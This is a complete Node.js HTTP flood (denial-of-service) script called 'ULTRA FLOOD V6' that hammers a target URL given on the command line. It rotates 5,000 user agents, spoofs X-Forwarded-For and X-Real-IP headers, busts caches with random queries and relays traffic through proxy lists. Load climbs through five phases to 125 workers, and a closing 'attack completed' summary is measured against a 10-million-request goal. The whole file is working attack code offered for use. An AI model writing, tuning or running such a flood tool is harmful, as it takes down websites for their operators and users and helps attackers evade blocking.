const http = require('http');
const https = require('https');
const url = require('url');
const fs = require('fs');
const net = require('net');
const path = require('path');
const cluster = require('cluster');
const os = require('os');

const uaGenerator = require('../ua-generator');

const target = process.argv[2];
const duration = parseInt(process.argv[3]) || 60;
const proxyFile = process.argv[4] || './proxy.txt';
const rateMultiplier = parseInt(process.argv[5]) || 100;

if (!target || !target.startsWith('http')) {
    console.log('Usage: node flood.js <URL> <DURATION> [PROXY_FILE] [RATE_MULTIPLIER]');
    console.log('Example: node flood.js https://target.com 120 proxy.txt 200');
    process.exit(1);
}

let proxies = [];
try {
    proxies = fs.readFileSync(proxyFile, 'utf8').split('\n').filter(p => p.trim());
} catch (e) {}

let userAgents = [];
const uaPath = path.join(__dirname, '..', '..', '..', 'assets', 'ua.txt');
try {
    userAgents = fs.readFileSync(uaPath, 'utf8').split('\n').filter(ua => ua.trim());
} catch (e) {
    userAgents = [];
}

console.log('[UA-GENERATOR] Pre-generating 5,000 User Agents...');
const UA_CACHE_SIZE = 5000;
const uaCache = new Array(UA_CACHE_SIZE);

const fileUACount = Math.floor(UA_CACHE_SIZE * 0.6);
const generatedUACount = UA_CACHE_SIZE - fileUACount;

let idx = 0;
if (userAgents.length > 0) {
    for (let i = 0; i < fileUACount; i++) {
        uaCache[idx++] = userAgents[Math.floor(Math.random() * userAgents.length)];
    }
}

for (let i = 0; i < generatedUACount; i++) {
    uaCache[idx++] = uaGenerator.generateUA();
}

if (userAgents.length === 0) {
    for (let i = 0; i < UA_CACHE_SIZE; i++) {
        uaCache[i] = uaGenerator.generateUA();
    }
}

for (let i = uaCache.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [uaCache[i], uaCache[j]] = [uaCache[j], uaCache[i]];
}

console.log(`[UA-GENERATOR] ${UA_CACHE_SIZE.toLocaleString()} UAs ready!`);

let uaIndex = 0;
function getRandomUA() {
    const ua = uaCache[uaIndex];
    uaIndex = (uaIndex + 1) % UA_CACHE_SIZE;
    return ua;
}

const parsedUrl = url.parse(target);
const isHttps = parsedUrl.protocol === 'https:';
const targetHost = parsedUrl.hostname;
const targetPort = parsedUrl.port || (isHttps ? 443 : 80);
const targetPath = parsedUrl.path || '/';

const acceptHeaders = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    '*/*',
    'application/json, text/plain, */*'
];

const encodings = ['gzip, deflate, br', 'gzip, deflate', 'br', 'identity'];

const languages = [
    'en-US,en;q=0.9', 'en-GB,en;q=0.9', 'es-ES,es;q=0.9', 'fr-FR,fr;q=0.9',
    'de-DE,de;q=0.9', 'ja-JP,ja;q=0.9', 'zh-CN,zh;q=0.9', 'pt-BR,pt;q=0.9'
];

const randomChars = 'abcdefghijklmnopqrstuvwxyz0123456789';
function randomString(len) {
    let result = '';
    for (let i = 0; i < len; i++) {
        result += randomChars[Math.floor(Math.random() * 36)];
    }
    return result;
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function generateQuery() {
    return `${randomString(5)}=${randomString(8)}&_=${Date.now()}&r=${Math.random().toString(36).slice(2)}`;
}

function getRandomProxy() {
    if (proxies.length === 0) return null;
    return proxies[Math.floor(Math.random() * proxies.length)];
}

function generateRandomIP() {
    return `${randomInt(1, 255)}.${randomInt(0, 255)}.${randomInt(0, 255)}.${randomInt(0, 255)}`;
}

const PHASE_CONFIG = {
    phase1: { start: 0, end: 0.20, rateMin: 1.5, rateMax: 2.0, name: 'AGGRESSIVE' },
    phase2: { start: 0.20, end: 0.60, rateMin: 2.0, rateMax: 3.5, name: 'HYPER-AGGRESSIVE' },
    phase3: { start: 0.60, end: 0.80, rateMin: 3.5, rateMax: 5.0, name: 'ULTRA-AGGRESSIVE' },
    phase4: { start: 0.80, end: 0.92, rateMin: 5.0, rateMax: 8.0, name: 'MEGA-AGGRESSIVE' },
    phase5: { start: 0.92, end: 1.0, rateMin: 8.0, rateMax: 15.0, name: 'MAXIMUM OVERDRIVE' }
};

const BOOST_THREADS = {
    phase1: { workers: 15, batch: 350, immediate: 20 },
    phase2: { workers: 30, batch: 500, immediate: 40 },
    phase3: { workers: 50, batch: 700, immediate: 60 },
    phase4: { workers: 75, batch: 900, immediate: 90 },
    phase5: { workers: 125, batch: 1100, immediate: 150 }
};

const AUTO_THROTTLE = {
    enabled: true,
    errorThreshold: 25,
    criticalThreshold: 40,
    recoveryThreshold: 15,
    throttleMultiplier: 0.5,
    criticalMultiplier: 0.25,
    checkInterval: 2000
};

let isThrottled = false;
let throttleLevel = 1.0;
let consecutiveHighErrors = 0;
let consecutiveLowErrors = 0;

function getPhaseInfo(elapsed, totalDuration) {
    const progress = elapsed / totalDuration;
    
    for (const [phaseName, config] of Object.entries(PHASE_CONFIG)) {
        if (progress >= config.start && progress < config.end) {
            const phaseProgress = (progress - config.start) / (config.end - config.start);
            const rate = config.rateMin + (config.rateMax - config.rateMin) * phaseProgress;
            return { phase: phaseName, name: config.name, rate, progress: Math.min(phaseProgress, 1) };
        }
    }
    
    const lastPhase = PHASE_CONFIG.phase5;
    return { phase: 'phase5', name: lastPhase.name, rate: lastPhase.rateMax, progress: 1 };
}

console.log('\n======================================================================');
console.log('   ULTRA FLOOD V6 - OPTIMIZED ENGINE (40-50% Less Workers)');
console.log('======================================================================');
console.log(`| Target:    ${target.substring(0, 50).padEnd(50)} |`);
console.log(`| Duration:  ${String(duration + 's').padEnd(50)} |`);
console.log(`| Proxies:   ${String(proxies.length).padEnd(50)} |`);
console.log(`| UA Cache:  ${String(UA_CACHE_SIZE.toLocaleString() + ' pre-generated').padEnd(50)} |`);
console.log(`| Rate:      ${String(rateMultiplier + 'x base multiplier').padEnd(50)} |`);
console.log(`| Mode:      OPTIMIZED (Reduced Workers + Higher Batch)              |`);
console.log(`| Throttle:  AUTO-THROTTLE ENABLED (${AUTO_THROTTLE.errorThreshold}%/${AUTO_THROTTLE.criticalThreshold}% thresholds)       |`);
console.log('======================================================================');
console.log('| Phase 1 (0-20%):   AGGRESSIVE       [15 workers, batch:350]       |');
console.log('| Phase 2 (20-60%):  HYPER-AGGRO      [30 workers, batch:500]       |');
console.log('| Phase 3 (60-80%):  ULTRA-AGGRO      [50 workers, batch:700]       |');
console.log('| Phase 4 (80-92%):  MEGA-AGGRO       [75 workers, batch:900]       |');
console.log('| Phase 5 (92-100%): MAX OVERDRIVE    [125 workers, batch:1100]     |');
console.log('======================================================================\n');

let totalSent = 0;
let totalSuccess = 0;
let totalErrors = 0;
let currentSent = 0;
let recentErrors = 0;
let recentSent = 0;

process.setMaxListeners(0);

const httpAgent = new http.Agent({
    keepAlive: true,
    keepAliveMsecs: 50000,
    maxSockets: Infinity,
    maxFreeSockets: 1000,
    timeout: 10000
});

const httpsAgent = new https.Agent({
    keepAlive: true,
    keepAliveMsecs: 50000,
    maxSockets: Infinity,
    maxFreeSockets: 1000,
    timeout: 10000,
    rejectUnauthorized: false
});

function sendHttpRequest() {
    if (isThrottled && Math.random() > throttleLevel) return;
    
    const options = {
        hostname: targetHost,
        port: targetPort,
        path: `${targetPath}?${generateQuery()}`,
        method: 'GET',
        agent: isHttps ? httpsAgent : httpAgent,
        headers: {
            'Host': targetHost,
            'User-Agent': getRandomUA(),
            'Accept': randomElement(acceptHeaders),
            'Accept-Language': randomElement(languages),
            'Accept-Encoding': randomElement(encodings),
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'X-Forwarded-For': generateRandomIP(),
            'X-Real-IP': generateRandomIP(),
            'X-Requested-With': 'XMLHttpRequest'
        },
        timeout: 8000
    };

    const client = isHttps ? https : http;
    try {
        const req = client.request(options, (res) => {
            totalSuccess++;
            res.on('data', () => {});
            res.resume();
        });
        
        req.on('error', () => { totalErrors++; recentErrors++; });
        req.on('timeout', () => { req.destroy(); });
        req.end();
        totalSent++;
        currentSent++;
        recentSent++;
    } catch (e) {
        totalErrors++;
        recentErrors++;
    }
}

const socketPool = [];
const maxPoolSize = 500;

function getPooledSocket(proxyHost, proxyPort) {
    const key = `${proxyHost}:${proxyPort}`;
    for (let i = 0; i < socketPool.length; i++) {
        if (socketPool[i].key === key && !socketPool[i].busy && socketPool[i].socket.writable) {
            socketPool[i].busy = true;
            return socketPool[i];
        }
    }
    return null;
}

function sendProxyRequest() {
    if (isThrottled && Math.random() > throttleLevel) return;
    
    const proxy = getRandomProxy();
    if (!proxy) {
        sendHttpRequest();
        return;
    }

    const [proxyHost, proxyPort] = proxy.split(':');
    
    try {
        const socket = net.connect({ 
            host: proxyHost, 
            port: parseInt(proxyPort) || 80,
            timeout: 5000
        });
        
        socket.setNoDelay(true);
        socket.setKeepAlive(true, 30000);
        
        socket.on('connect', () => {
            const ip = generateRandomIP();
            const request = `GET ${target}?${generateQuery()} HTTP/1.1\r\n` +
                `Host: ${targetHost}\r\n` +
                `User-Agent: ${getRandomUA()}\r\n` +
                `Accept: ${randomElement(acceptHeaders)}\r\n` +
                `Accept-Language: ${randomElement(languages)}\r\n` +
                `Accept-Encoding: ${randomElement(encodings)}\r\n` +
                `Cache-Control: no-cache\r\n` +
                `X-Forwarded-For: ${ip}\r\n` +
                `X-Real-IP: ${ip}\r\n` +
                `Connection: keep-alive\r\n\r\n`;
            
            const batchCount = Math.floor(15 * throttleLevel);
            for (let i = 0; i < batchCount; i++) {
                if (socket.writable) {
                    socket.write(request);
                    totalSent++;
                    currentSent++;
                    recentSent++;
                }
            }
            totalSuccess++;
            setTimeout(() => { 
                if (!socket.destroyed) socket.destroy(); 
            }, 3000);
        });
        
        socket.on('error', () => { 
            totalErrors++;
            recentErrors++;
            if (!socket.destroyed) socket.destroy(); 
        });
        socket.on('timeout', () => { 
            if (!socket.destroyed) socket.destroy(); 
        });
    } catch (e) {
        totalErrors++;
        recentErrors++;
    }
}

const useProxy = proxies.length > 0;
const requestFn = useProxy ? sendProxyRequest : sendHttpRequest;

const startTime = Date.now();
const durationMs = duration * 1000;

let activeWorkers = [];
let currentBatchSize = 80;
let currentLoopCount = Math.floor(rateMultiplier * 0.35);

function adjustWorkers(targetRate) {
    const targetLoops = Math.floor(rateMultiplier * targetRate * 0.5);
    const targetBatch = Math.floor(180 * targetRate);
    
    currentLoopCount = targetLoops;
    currentBatchSize = Math.max(40, targetBatch);
}

function createWorkerBatch(count, batchSize, interval) {
    const adjustedCount = Math.floor(count * throttleLevel);
    for (let t = 0; t < adjustedCount; t++) {
        const id = setInterval(() => {
            const adjustedBatch = Math.floor(batchSize * throttleLevel);
            for (let i = 0; i < adjustedBatch; i++) {
                requestFn();
            }
        }, interval);
        activeWorkers.push(id);
    }
}

function createImmediateWorkers(count, batchSize) {
    const adjustedCount = Math.floor(count * throttleLevel);
    for (let t = 0; t < adjustedCount; t++) {
        setImmediate(function loop() {
            const elapsed = Date.now() - startTime;
            if (elapsed >= durationMs) return;
            
            if (isThrottled && Math.random() > throttleLevel) {
                setTimeout(loop, 10);
                return;
            }
            
            const phaseInfo = getPhaseInfo(elapsed, durationMs);
            const dynamicBatch = Math.floor(batchSize * phaseInfo.rate * throttleLevel);
            
            for (let i = 0; i < dynamicBatch; i++) {
                requestFn();
            }
            setImmediate(loop);
        });
    }
}

createWorkerBatch(Math.floor(currentLoopCount * 0.8), 250, 1);
createWorkerBatch(Math.floor(currentLoopCount * 0.5), 180, 0);
createImmediateWorkers(30, 80);

const initialBoost = BOOST_THREADS.phase1;
console.log(`OPTIMIZED START: Spawning ${initialBoost.workers} workers + ${initialBoost.immediate} immediate loops (batch:${initialBoost.batch})...`);
createWorkerBatch(initialBoost.workers, initialBoost.batch, 1);
createImmediateWorkers(initialBoost.immediate, Math.floor(initialBoost.batch * 0.6));

let lastPhase = '';
let lastErrors = 0;
let phaseStartTime = Date.now();
let phaseRequests = 0;

function checkAutoThrottle() {
    if (!AUTO_THROTTLE.enabled) return;
    
    const currentErrorRate = recentSent > 0 ? (recentErrors / recentSent) * 100 : 0;
    
    if (currentErrorRate >= AUTO_THROTTLE.criticalThreshold) {
        consecutiveHighErrors++;
        consecutiveLowErrors = 0;
        if (consecutiveHighErrors >= 2) {
            throttleLevel = AUTO_THROTTLE.criticalMultiplier;
            isThrottled = true;
            console.log(`[AUTO-THROTTLE] CRITICAL: Error rate ${currentErrorRate.toFixed(1)}% - Throttle to ${(throttleLevel * 100).toFixed(0)}%`);
        }
    } else if (currentErrorRate >= AUTO_THROTTLE.errorThreshold) {
        consecutiveHighErrors++;
        consecutiveLowErrors = 0;
        if (consecutiveHighErrors >= 2) {
            throttleLevel = AUTO_THROTTLE.throttleMultiplier;
            isThrottled = true;
            console.log(`[AUTO-THROTTLE] WARNING: Error rate ${currentErrorRate.toFixed(1)}% - Throttle to ${(throttleLevel * 100).toFixed(0)}%`);
        }
    } else if (currentErrorRate <= AUTO_THROTTLE.recoveryThreshold) {
        consecutiveLowErrors++;
        consecutiveHighErrors = 0;
        if (consecutiveLowErrors >= 3 && isThrottled) {
            throttleLevel = Math.min(1.0, throttleLevel + 0.25);
            if (throttleLevel >= 1.0) {
                isThrottled = false;
                console.log(`[AUTO-THROTTLE] RECOVERED: Error rate ${currentErrorRate.toFixed(1)}% - Full speed restored`);
            } else {
                console.log(`[AUTO-THROTTLE] RECOVERING: Error rate ${currentErrorRate.toFixed(1)}% - Throttle now ${(throttleLevel * 100).toFixed(0)}%`);
            }
        }
    }
    
    recentErrors = 0;
    recentSent = 0;
}

const throttleInterval = setInterval(checkAutoThrottle, AUTO_THROTTLE.checkInterval);

const statsInterval = setInterval(() => {
    const elapsed = Date.now() - startTime;
    const phaseInfo = getPhaseInfo(elapsed, durationMs);
    
    if (phaseInfo.phase !== lastPhase) {
        if (lastPhase !== '') {
            const boostConfig = BOOST_THREADS[phaseInfo.phase];
            const threadInfo = boostConfig ? ` [+${boostConfig.workers} threads, batch:${boostConfig.batch}]` : '';
            console.log(`\n${'='.repeat(65)}`);
            console.log(`  ${phaseInfo.name} PHASE STARTED - Rate: ${(phaseInfo.rate * 100).toFixed(0)}%${threadInfo}`);
            console.log(`${'='.repeat(65)}\n`);
        }
        lastPhase = phaseInfo.phase;
        phaseStartTime = Date.now();
        phaseRequests = 0;
        
        adjustWorkers(phaseInfo.rate);
        
        const boostConfig = BOOST_THREADS[phaseInfo.phase];
        if (boostConfig && !isThrottled) {
            console.log(`  Spawning ${boostConfig.workers} worker threads + ${boostConfig.immediate} immediate loops...`);
            createWorkerBatch(boostConfig.workers, boostConfig.batch, 1);
            createWorkerBatch(Math.floor(boostConfig.workers * 0.3), Math.floor(boostConfig.batch * 0.9), 0);
            createImmediateWorkers(boostConfig.immediate, Math.floor(boostConfig.batch * 0.5));
        }
    }
    
    const rps = currentSent;
    phaseRequests += rps;
    const errorRate = totalSent > 0 ? ((totalErrors / totalSent) * 100).toFixed(1) : 0;
    const newErrors = totalErrors - lastErrors;
    lastErrors = totalErrors;
    
    let status = '[OK]';
    if (errorRate > 30) status = '[HIGH-ERR]';
    else if (errorRate > 15) status = '[WARN]';
    
    const throttleStatus = isThrottled ? ` [THROTTLED:${(throttleLevel * 100).toFixed(0)}%]` : '';
    const phaseProgress = (phaseInfo.progress * 100).toFixed(0);
    const ratePercent = (phaseInfo.rate * 100).toFixed(0);
    
    currentSent = 0;
    console.log(`${status} ${phaseInfo.name} [${phaseProgress}%|${ratePercent}%] RPS: ${rps.toLocaleString()}/s | Total: ${totalSent.toLocaleString()} | Success: ${totalSuccess.toLocaleString()} | Err: ${newErrors} (${errorRate}%)${throttleStatus}`);
}, 1000);

setTimeout(() => {
    clearInterval(statsInterval);
    clearInterval(throttleInterval);
    activeWorkers.forEach(id => clearInterval(id));
    
    const avgRps = Math.floor(totalSent / duration);
    const successRate = totalSent > 0 ? ((totalSuccess / totalSent) * 100).toFixed(1) : 0;
    const errorRate = totalSent > 0 ? ((totalErrors / totalSent) * 100).toFixed(1) : 0;
    
    const targetHit = totalSent >= 10000000 ? '10M+ HIT!' : `${((totalSent / 10000000) * 100).toFixed(1)}% of 10M`;
    
    console.log('\n======================================================================');
    console.log('       OPTIMIZED FLOOD ATTACK COMPLETED');
    console.log('======================================================================');
    console.log(`| Total Requests:  ${String(totalSent.toLocaleString()).padEnd(44)} |`);
    console.log(`| Target Status:   ${String(targetHit).padEnd(44)} |`);
    console.log(`| Total Success:   ${String(totalSuccess.toLocaleString()).padEnd(44)} |`);
    console.log(`| Total Errors:    ${String(totalErrors.toLocaleString()).padEnd(44)} |`);
    console.log(`| Success Rate:    ${String(successRate + '%').padEnd(44)} |`);
    console.log(`| Error Rate:      ${String(errorRate + '%').padEnd(44)} |`);
    console.log(`| Avg RPS:         ${String(avgRps.toLocaleString() + '/s').padEnd(44)} |`);
    console.log(`| Total Workers:   ${String(activeWorkers.length + ' threads spawned').padEnd(44)} |`);
    console.log('======================================================================');
    console.log('| OPTIMIZATION: 40-50% less workers, higher batch, auto-throttle   |');
    console.log('======================================================================\n');
    process.exit(0);
}, duration * 1000);

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
